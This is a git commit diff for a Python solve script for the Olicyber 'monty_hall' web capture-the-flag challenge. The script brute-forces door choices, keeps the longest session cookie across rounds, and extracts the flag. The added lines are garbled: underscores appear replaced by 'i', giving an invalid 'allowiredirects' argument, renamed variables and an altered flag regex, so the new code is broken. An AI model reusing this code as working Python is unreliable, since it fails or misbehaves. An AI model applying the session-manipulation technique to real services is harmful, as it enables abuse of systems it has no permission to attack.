797ab60dfd3f7250fa18a4bce3da8cf21ae95c1b
Federico Bosio <federicobosio0209@gmail.com>
2025-08-03 19:02:19 +0200

    .

--- Intro-Olicyber/web/monty_hall.py
+++ Intro-Olicyber/web/monty_hall.py
@@ -1,74 +1,26 @@
-"""
-#!/usr/bin/env python3
-
-import logging
-import os
-import requests
-import re
-
-# For HTTP connection
-URL = os.environ.get("URL", "http://monty-hall.challs.olicyber.it")
-if URL.endswith("/"):
-    URL = URL[:-1]
-
-
-def make_request(session, choice):
-    r = requests.post(URL, cookies={"session": session}, data={"choice": choice}, allow_redirects=False)
-    return r.text, r.cookies['session']
-
-
-def solve():
-    # Get a token for the first level
-    _, current_session = make_request("asd", 1)
-
-    # Loop maximum 12 times
-    for _ in range(12):
-        # Try all three doors
-        new_sessions = []
-        for i in range(1, 4):
-            content, new_session = make_request(current_session, i)
-
-            # If flag found, print it and quit
-            if "flag{" in content:
-                res = re.findall(r"flag\{[a-zA-Z0-9_]*}", content)[0]
-                print(res)
-                return
-
-            new_sessions.append(new_session)
-
-        # Choose the longest session
-        current_session = max(new_sessions, key=lambda x: len(x))
-
-
-if __name__ == '__main__':
-    solve()
-"""
 import re
 import requests
 
 url = 'http://monty-hall.challs.olicyber.it/'
 
-def make_requests(session, choice):
-    r = requests.post(url,cookies={'session':f'{session}'},data={'choice': f'{choice}'}, allow_redirects=False)
+def req(session, choice):
+    r = requests.post(url,cookies={'session':f'{session}'},data={'choice': f'{choice}'}, allowiredirects=False)
     return r.text, r.cookies['session']
 
 def solve():
-    _, current_session = make_requests('asd','1')
+    i, currentSession = req('asd','1')
 
-    for _ in range(12):
-        new_sessions = []
+    for i in range(12):
+        newisessions = []
         for i in range(1, 4):
-            content, new_session = make_requests(current_session, i)
-
+            content, newisession = req(currentSession, i)
             if 'flag{' in content:
-                print(content)
-                #res = re.findall(r"flag\{[a-zA-Z0-9_]*}", content)[0]
-                #print(res)
+                res = re.findall(r"flag\{[a-zA-Z0-9i]*}", content)[0]
+                print(res)
                 return
 
-            new_sessions.append(new_session)
-
-        current_session = max(new_sessions, key=lambda x: len(x))
+            newisessions.append(newisession)
+        currentSession = max(newisessions, key=lambda x: len(x))
 
 
 solve()
